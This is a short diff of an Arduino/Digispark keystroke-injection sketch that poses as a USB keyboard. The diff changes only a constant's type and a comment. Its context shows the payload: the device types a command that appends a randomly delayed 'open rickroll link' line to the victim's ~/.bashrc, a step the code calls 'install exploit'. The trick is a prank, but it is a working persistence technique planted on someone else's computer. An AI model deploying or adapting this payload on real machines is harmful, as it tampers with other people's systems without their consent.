@@ -1,6 +1,6 @@
 #include "DigiKeyboard.h"
 
-#define ANNOYANCE_LEVEL 600
+#define ANNOYANCE_LEVEL "600"
 #define RICK_ROLL_LINK "https://archive.org/details/never-gonna-give-you-up-edit-wvm7gv"
 #define RICK_ROLL_COMMAND "sleep $(( $RANDOM % " ANNOYANCE_LEVEL " )) && x-www-browser " RICK_ROLL_LINK " &"
 
@@ -25,7 +25,7 @@ void setup() {
   // change keyboad layout
   write("setxkbmap us");
 
-  // install exploit
+// install exploit
   write("echo \"" RICK_ROLL_COMMAND "\" >> ~/.bashrc");
 
   // change keyboard layout back
